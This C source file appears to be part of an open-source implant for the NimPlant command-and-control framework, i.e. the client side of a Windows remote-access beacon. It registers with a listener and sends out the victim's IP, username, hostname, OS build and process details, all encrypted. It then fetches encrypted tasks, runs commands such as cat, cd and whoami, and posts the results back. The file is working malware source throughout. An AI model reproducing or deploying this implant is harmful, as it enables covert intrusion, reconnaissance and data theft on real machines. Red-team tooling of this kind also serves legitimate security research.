/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Initialize NimPlant client.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @returns bool Positive if semi-initialized
 */
bool InitializeNimPlantClient(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client) {
    BOOL bResultStatus = false;
    char* lpResponseBody = NULL;
    HINTERNET hSession;
    HINTERNET hRequest;

    // Perform GET request for initalization
    if (!HttpGetRequest(context, config->ListenerIP, config->ListenerRegisterPath, config->ListenerPort, config->ListenerType == 1, config->NimPlantUserAgent, NULL, 0, &hSession, &hRequest)) {
        goto FAILURE_AND_RETURN;
    }

    // Get HTTP response for initalization
    if (!GetHttpResponseBody(context, hRequest, (uint8_t**) &lpResponseBody)) {
        goto FAILURE_AND_RETURN;
    }

    // Try to parse the JSON in the HTTP response
    int dwMaximumJsonPoolSize = json_create_get_max_size(lpResponseBody);
    json_t* lpJsonPool = (json_t*) context->functions.calloc(dwMaximumJsonPoolSize, sizeof(json_t));
    json_t const* lpJson = json_create((char*) lpResponseBody, lpJsonPool, dwMaximumJsonPoolSize * sizeof(json_t));

    // Parsing the JSON must be successful
    if (!lpJson) goto FAILURE_AND_RETURN;

    // We must be able to get the ID & key within the JSON
    DEFINE_STRING(IdName, "id");
    DEFINE_STRING(KeyName, "k");

    json_t const* sIdProperty = json_getProperty(lpJson, IdName);
    json_t const* sKeyProperty = json_getProperty(lpJson, KeyName);
    if (!sIdProperty || !sKeyProperty) goto FAILURE_AND_RETURN;

    // The ID & key must be of type `JSON_TEXT`
    if (json_getType(sIdProperty) != JSON_TEXT) goto FAILURE_AND_RETURN;
    if (json_getType(sKeyProperty) != JSON_TEXT) goto FAILURE_AND_RETURN;

    // We must be able to get the ID value
    const char* lpId = json_getValue(sIdProperty);
    if (!lpId) goto FAILURE_AND_RETURN;

    // Copy the ID value to our `NimPlantClient` struct
    client->id = context->functions.calloc(context->functions.strlen(lpId) + 1, sizeof(char));
    context->functions.strcpy(client->id, lpId);

    // We must be able to get the key value
    const char* lpEncodedKey = json_getValue(sKeyProperty);
    if (!lpEncodedKey) goto FAILURE_AND_RETURN;

    // We must be able to decode the key as well
    size_t sDecodedKeyLength;
    char* lpDecodedKey = (char*) Base64Decode(context, (char*) lpEncodedKey, context->functions.strlen(lpEncodedKey), &sDecodedKeyLength);
    if (!lpDecodedKey) goto FAILURE_AND_RETURN;

    // Copy the key value to our `NimPlantClient` struct
    client->key = context->functions.calloc(sDecodedKeyLength + 1, sizeof(char));
    context->functions.strcpy(client->key, lpDecodedKey);

    // XOR the key using the embedded XOR-key
    XorData((uint8_t*) client->key, context->functions.strlen(lpDecodedKey), config->XorKey);

    // If we reach this statement everything was successful.
    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

FAILURE_AND_RETURN:
    if (client->id != NULL) context->functions.free(client->id);
    if (client->key != NULL) context->functions.free(client->key);
    client->id = NULL;
    client->key = NULL;
    goto CLEANUP_AND_RETURN;

CLEANUP_AND_RETURN:
    if (hRequest != NULL) context->functions.WinHttpCloseHandle(hRequest);
    if (hSession != NULL) context->functions.WinHttpCloseHandle(hSession);
    if (lpResponseBody != NULL) context->functions.free(lpResponseBody);
    if (lpDecodedKey != NULL) context->functions.free(lpDecodedKey);
    goto RETURN;

RETURN:
    return bResultStatus;
}

/**
 * Register NimPlant client.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @returns bool Positive if fully-initialized
 */
bool RegisterNimPlantClient(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client) {
    BOOL bResultStatus = false;
    HINTERNET hSession;
    HINTERNET hRequest;

    // Create `X-Identifier: ` header (header (14) + id (8) + nullbyte (1) in length)
    wchar_t wHeaderIdentifier[23] = { 0x0 };

    // Copy the initial part of the header
    DEFINE_WSTRING(HeaderIdentifierKey, "X-Identifier: ");
    context->functions.wcscat_s(wHeaderIdentifier, 23, HeaderIdentifierKey);
    
    // Append client->id to the header
    wchar_t* client_id = RelocatableCharToWchar(context, client->id);
    context->functions.wcscat_s(wHeaderIdentifier, 23, client_id);

    // Define content type header
    DEFINE_WSTRING(wHeaderContentType, "Content-Type: application/json");
    wchar_t* wHeaders[2] = { wHeaderIdentifier, wHeaderContentType };

    // Define the initalization variables
    char* lpIpInternal = GetPrimaryIPAddress(context);
    char* lpUsername = GetCurrentUserName(context);
    char* lpHostname = GetCurrentHostName(context);
    char* lpOsBuild = GetOSBuildNumber(context);
    DWORD dwProcessId = context->functions.GetCurrentProcessId();
    char* lpProcessName = GetCurrentProcessName(context);
    bool dwRiskyMode = config->NimPlantRiskyMode;

    // Define inner JSON format JSON string length
    DEFINE_STRING(lpInnerJsonFormatter, "{'i': %s, 'u': %s, 'h': %s, 'o': %s, 'p': %d, 'P': %s, 'r': %d}");
    DWORD dwInnerJsonMaximumLength = 
        context->functions.strlen(lpInnerJsonFormatter) +
        (context->functions.strlen(lpIpInternal) * 6) +
        (context->functions.strlen(lpUsername) * 6) +
        (context->functions.strlen(lpHostname) * 6) +
        (context->functions.strlen(lpOsBuild) * 6) +
        10 +
        (context->functions.strlen(lpProcessName) * 6) +
        10;

    // Create buffer for inner JSON
    char* lpInnerJson = context->functions.calloc(dwInnerJsonMaximumLength + 1, sizeof(char));
    if (lpInnerJson == NULL) goto CLEANUP_AND_RETURN;

    // Create inner JSON
    if (jsnprintf(context, lpInnerJson, dwInnerJsonMaximumLength, lpInnerJsonFormatter, lpIpInternal, lpUsername, lpHostname, lpOsBuild, dwProcessId, lpProcessName, dwRiskyMode) <= 0) {
        goto CLEANUP_AND_RETURN;
    }

    // Encrypt the created JSON
    char* lpEncryptedData = (char*) EncryptData(context, (uint8_t*) lpInnerJson, context->functions.strlen(lpInnerJson), (uint8_t*) client->key);
    if (lpEncryptedData == NULL) goto CLEANUP_AND_RETURN;

    // Define outer JSON format JSON string length
    DEFINE_STRING(lpOuterJsonFormatter, "{'data': %s}");
    DWORD dwOuterJsonMaximumLength = 
        context->functions.strlen(lpOuterJsonFormatter) + 
        (context->functions.strlen(lpEncryptedData) * 6);

    // Create buffer for outer JSON
    char* lpOuterJson = context->functions.calloc(dwOuterJsonMaximumLength + 1, sizeof(char));
    if (lpOuterJson == NULL) goto CLEANUP_AND_RETURN;

    // Create outer JSON
    if (jsnprintf(context, lpOuterJson, dwOuterJsonMaximumLength, lpOuterJsonFormatter, lpEncryptedData) <= 0) {
        goto CLEANUP_AND_RETURN;
    }

    // Perform HTTP post request
    if (!HttpPostRequest(context, config->ListenerIP, config->ListenerRegisterPath, config->ListenerPort, config->ListenerType == 1, lpOuterJson, config->NimPlantUserAgent, wHeaders, 2, &hSession, &hRequest)) {
        goto CLEANUP_AND_RETURN;
    }

    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

CLEANUP_AND_RETURN:
    if (hRequest != NULL) context->functions.WinHttpCloseHandle(hRequest);
    if (hSession != NULL) context->functions.WinHttpCloseHandle(hSession);
    if (lpIpInternal != NULL) context->functions.free(lpIpInternal);
    if (lpUsername != NULL) context->functions.free(lpUsername);
    if (lpHostname != NULL) context->functions.free(lpHostname);
    if (lpOsBuild != NULL) context->functions.free(lpOsBuild);
    if (lpProcessName != NULL) context->functions.free(lpProcessName);
    if (lpInnerJson != NULL) context->functions.free(lpInnerJson);
    if (lpEncryptedData != NULL) context->functions.free(lpEncryptedData);
    if (lpOuterJson != NULL) context->functions.free(lpOuterJson);
    goto RETURN;

RETURN:
    return bResultStatus;
}

/**
 * Get a new task for the NimPlant to perform.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @returns struct NimPlantTask* The newly allocated task to perform.
 */
struct NimPlantTask* GetTaskForNimPlantClient(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client) {
    struct NimPlantTask* lpResultTask = NULL;
    char* lpTaskJsonDecrypted = NULL;
    char* lpResponseBody = NULL;
    HINTERNET hSession;
    HINTERNET hRequest;

    // Create `X-Identifier: ` header (header (14) + id (8) + nullbyte (1) in length)
    wchar_t wHeaderIdentifier[23] = { 0x0 };

    // Copy the initial part of the header
    DEFINE_WSTRING(HeaderIdentifierKey, "X-Identifier: ");
    context->functions.wcscat_s(wHeaderIdentifier, 23, HeaderIdentifierKey);
    
    // Append client->id to the header
    wchar_t* lpClientId = RelocatableCharToWchar(context, client->id);
    context->functions.wcscat_s(wHeaderIdentifier, 23, lpClientId);

    // Define header(s) in array
    wchar_t* wHeaders[1] = { wHeaderIdentifier };

    // Perform GET request for task
    if (!HttpGetRequest(context, config->ListenerIP, config->ListenerTaskPath, config->ListenerPort, config->ListenerType == 1, config->NimPlantUserAgent, wHeaders, 1, &hSession, &hRequest)) {
        goto FAILURE_AND_RETURN;
    }

    // Get HTTP response for initalization
    if (!GetHttpResponseBody(context, hRequest, (uint8_t**) &lpResponseBody)) {
        goto FAILURE_AND_RETURN;
    }

    // Create JSON pool for response body
    int dwMaximumOuterJsonPoolSize = json_create_get_max_size(lpResponseBody);
    json_t* lpOuterJsonPool = (json_t*) context->functions.calloc(dwMaximumOuterJsonPoolSize, sizeof(json_t));
    json_t const* lpOuterJson = json_create((char*) lpResponseBody, lpOuterJsonPool, dwMaximumOuterJsonPoolSize * sizeof(json_t));

    // We must be able to parse the outer JSON
    if (!lpOuterJson) goto FAILURE_AND_RETURN;

    // We must be able to get the task (`t`) key within the JSON
    DEFINE_STRING(TaskName, "t");
    json_t const* sTaskProperty = json_getProperty(lpOuterJson, TaskName);  
    if (!sTaskProperty) { goto FAILURE_AND_RETURN; }

    // The task key must be of type `JSON_TEXT`
    if (json_getType(sTaskProperty) != JSON_TEXT) goto FAILURE_AND_RETURN;

    // We must be able to get the task value
    const char* lpTask = json_getValue(sTaskProperty);
    if (lpTask == NULL) goto FAILURE_AND_RETURN;

    // We must be able to decrypt the task data
    lpTaskJsonDecrypted = (char*) DecryptData(context, (char*) lpTask, context->functions.strlen(lpTask), (uint8_t*) client->key);
    if (lpTaskJsonDecrypted == NULL) goto FAILURE_AND_RETURN;

    // Create JSON pool for task: {"guid": guid, "command": command, "args": [...]}
    int dwMaximumInnerJsonPoolSize = json_create_get_max_size(lpTaskJsonDecrypted);
    json_t* lpInnerJsonPool = (json_t*) context->functions.calloc(dwMaximumInnerJsonPoolSize, sizeof(json_t));
    json_t const* lpInnerJson = json_create((char*) lpTaskJsonDecrypted, lpInnerJsonPool, dwMaximumInnerJsonPoolSize * sizeof(json_t));
    
    // We must be able to parse the JSON 
    if (!lpInnerJson) goto FAILURE_AND_RETURN;

    // We must be able to get the guid, command and args keys within the JSON
    DEFINE_STRING(GuidName, "guid");
    DEFINE_STRING(CommandName, "command");
    DEFINE_STRING(ArgsName, "args");

    json_t const* sGuidProperty = json_getProperty(lpInnerJson, GuidName);
    json_t const* sCommandProperty = json_getProperty(lpInnerJson, CommandName);
    json_t const* sArgsProperty = json_getProperty(lpInnerJson, ArgsName);

    if (!sGuidProperty || !sCommandProperty || !sArgsProperty) { goto FAILURE_AND_RETURN; }

    // The keys must be of a specific JSON type
    if (json_getType(sGuidProperty) != JSON_TEXT) goto FAILURE_AND_RETURN;
    if (json_getType(sCommandProperty) != JSON_TEXT) goto FAILURE_AND_RETURN;
    if (json_getType(sArgsProperty) != JSON_ARRAY) goto FAILURE_AND_RETURN;

    DWORD dwArgumentCount = 0;
    json_t const* sArgProperty;
    for(sArgProperty = json_getChild(sArgsProperty); sArgProperty != 0; sArgProperty = json_getSibling(sArgProperty)) {
        if (json_getType(sArgProperty) != JSON_TEXT) goto FAILURE_AND_RETURN;
        dwArgumentCount ++;
    }

    // We must be able to get the values of the keys
    const char* lpTaskGuid = json_getValue(sGuidProperty);
    const char* lpTaskCommand = json_getValue(sCommandProperty);

    // Create result
    lpResultTask = (struct NimPlantTask*) context->functions.calloc(1, sizeof(struct NimPlantTask));

    // Create & copy GUID
    lpResultTask->guid = context->functions.calloc(context->functions.strlen(lpTaskGuid) + 1, sizeof(char));
    if (lpResultTask->guid == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpResultTask->guid, lpTaskGuid);

    // Create & copy GUID
    lpResultTask->command = context->functions.calloc(context->functions.strlen(lpTaskCommand) + 1, sizeof(char));
    if (lpResultTask->command == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpResultTask->command, lpTaskCommand);

    // Create arguments space
    if (dwArgumentCount > 0) {
        lpResultTask->argumentsCount = dwArgumentCount;
        lpResultTask->arguments = (char**) context->functions.calloc(dwArgumentCount, sizeof(char*));
        if (lpResultTask->arguments == NULL) goto FAILURE_AND_RETURN;
    } else {
        lpResultTask->argumentsCount = 0;
        lpResultTask->arguments = NULL;
    }

    // Copy arguments
    DWORD dwArgumentIndex = 0;
    for(sArgProperty = json_getChild(sArgsProperty); sArgProperty != 0; sArgProperty = json_getSibling(sArgProperty)) {
        if (json_getType(sArgProperty) != JSON_TEXT) goto FAILURE_AND_RETURN;
        if (dwArgumentIndex >= dwArgumentCount) goto FAILURE_AND_RETURN;

        // Copy the argument value to our `NimPlantTask` struct
        char* lpArgument = (char*) json_getValue(sArgProperty);
        lpResultTask->arguments[dwArgumentIndex] = (char*) context->functions.calloc(context->functions.strlen(lpArgument) + 1, sizeof(char));
        if (lpResultTask->arguments[dwArgumentIndex] == NULL) goto FAILURE_AND_RETURN;

        context->functions.strcpy(lpResultTask->arguments[dwArgumentIndex], lpArgument);
    }

    goto CLEANUP_AND_RETURN;

FAILURE_AND_RETURN:
    FreeTask(context, lpResultTask);
    goto CLEANUP_AND_RETURN;

CLEANUP_AND_RETURN:
    if (hRequest != NULL) context->functions.WinHttpCloseHandle(hRequest);
    if (hSession != NULL) context->functions.WinHttpCloseHandle(hSession);
    if (lpTaskJsonDecrypted != NULL) context->functions.free(lpTaskJsonDecrypted);
    if (lpResponseBody != NULL) context->functions.free(lpResponseBody);
    if (lpClientId != NULL) context->functions.free(lpClientId);
    goto RETURN;

RETURN:
    return lpResultTask;
}

/**
 * Execute the given task by performing the command & returning the result.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @param struct NimPlantTask* The task to perform.
 * @return bool Positive if successful.
 */
bool ExecuteTaskForNimPlantClient(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client, struct NimPlantTask* lpTask) {
    int bCompare;

    // cat
    DEFINE_STRING(CatCommand, "cat");
    bCompare = context->functions.strcmp(lpTask->command, CatCommand);
    if (bCompare == 0) return CommandCat(context, config, client, lpTask);

    // cd
    DEFINE_STRING(CdCommand, "cd");
    bCompare = context->functions.strcmp(lpTask->command, CdCommand);
    if (bCompare == 0) return CommandCd(context, config, client, lpTask);

    // whoami
    DEFINE_STRING(WhoamiCommand, "whoami");
    bCompare = context->functions.strcmp(lpTask->command, WhoamiCommand);
    if (bCompare == 0) return CommandWhoami(context, config, client, lpTask);

    // not implemented
    DEFINE_STRING(lpNotImplemented, "[not implemented]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpNotImplemented) + 1, sizeof(char));
    if (lpTask->result == NULL) return false;
    context->functions.strcpy(lpTask->result, lpNotImplemented);

    return true;
}

/**
 * Post a result of a command back to the server
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @param struct NimPlantTask* The task that was performed (and holds the result).
 * @param bool bResult Positive if it was successfully executed.
 * @return bool Positive if successful.
 */
bool PostTaskForNimPlantClient(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client, struct NimPlantTask* lpTask, bool bResult) {
    BOOL bResultStatus = false;
    char* lpResultEncoded = NULL;
    HINTERNET hSession;
    HINTERNET hRequest;

    // Create `X-Identifier: ` header (header (14) + id (8) + nullbyte (1) in length)
    wchar_t wHeaderIdentifier[23] = { 0x0 };

    // Copy the initial part of the header
    DEFINE_WSTRING(HeaderIdentifierKey, "X-Identifier: ");
    context->functions.wcscat_s(wHeaderIdentifier, 23, HeaderIdentifierKey);
    
    // Append client->id to the header
    wchar_t* client_id = RelocatableCharToWchar(context, client->id);
    context->functions.wcscat_s(wHeaderIdentifier, 23, client_id);

    // Define content type header
    DEFINE_WSTRING(wHeaderContentType, "Content-Type: application/json");
    wchar_t* wHeaders[2] = { wHeaderIdentifier, wHeaderContentType };

    // Base64 encode the command result
    if (!bResult) {
        DEFINE_STRING(lpFatalError, "[fatal error]");
        lpResultEncoded = Base64Encode(context, (uint8_t*) lpFatalError, context->functions.strlen(lpFatalError), NULL);
    } else if (lpTask->result == NULL) {
        DEFINE_STRING(lpEmptyResponse, "[empty response]");
        lpResultEncoded = Base64Encode(context, (uint8_t*) lpEmptyResponse, context->functions.strlen(lpEmptyResponse), NULL);
    } else {
        lpResultEncoded = Base64Encode(context, (uint8_t*) lpTask->result, context->functions.strlen(lpTask->result), NULL);
    }

    // Define outer JSON format JSON string length
    DEFINE_STRING(lpInnerJsonFormatter, "{\"result\": %s, \"guid\": %s}");
    DWORD dwInnerJsonMaximumLength = 
        context->functions.strlen(lpInnerJsonFormatter) + 
        (context->functions.strlen(lpResultEncoded) * 6) +
        (context->functions.strlen(lpTask->guid) * 6);

    // Create buffer for outer JSON
    char* lpInnerJson = context->functions.calloc(dwInnerJsonMaximumLength + 1, sizeof(char));
    if (lpInnerJson == NULL) goto CLEANUP_AND_RETURN;

    // Create outer JSON
    if (jsnprintf(context, lpInnerJson, dwInnerJsonMaximumLength, lpInnerJsonFormatter, lpResultEncoded, lpTask->guid) <= 0) {
        goto CLEANUP_AND_RETURN;
    }

    // Encrypt the created JSON
    char* lpEncryptedData = (char*) EncryptData(context, (uint8_t*) lpInnerJson, context->functions.strlen(lpInnerJson), (uint8_t*) client->key);
    if (lpEncryptedData == NULL) goto CLEANUP_AND_RETURN;

    // Define outer JSON format JSON string length
    DEFINE_STRING(lpOuterJsonFormatter, "{'data': %s}");
    DWORD dwOuterJsonMaximumLength = 
        context->functions.strlen(lpOuterJsonFormatter) + 
        (context->functions.strlen(lpEncryptedData) * 6);

    // Create buffer for outer JSON
    char* lpOuterJson = context->functions.calloc(dwOuterJsonMaximumLength + 1, sizeof(char));
    if (lpOuterJson == NULL) goto CLEANUP_AND_RETURN;

    // Create outer JSON
    if (jsnprintf(context, lpOuterJson, dwOuterJsonMaximumLength, lpOuterJsonFormatter, lpEncryptedData) <= 0) {
        goto CLEANUP_AND_RETURN;
    }
    
    // Perform HTTP post request
    if (!HttpPostRequest(context, config->ListenerIP, config->ListenerResultPath, config->ListenerPort, config->ListenerType == 1, lpOuterJson, config->NimPlantUserAgent, wHeaders, 2, &hSession, &hRequest)) {
        goto CLEANUP_AND_RETURN;
    }

    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

CLEANUP_AND_RETURN:
    if (hRequest != NULL) context->functions.WinHttpCloseHandle(hRequest);
    if (hSession != NULL) context->functions.WinHttpCloseHandle(hSession);
    if (lpResultEncoded != NULL) context->functions.free(lpResultEncoded);
    if (lpEncryptedData != NULL) context->functions.free(lpEncryptedData);

    return bResultStatus;  
}


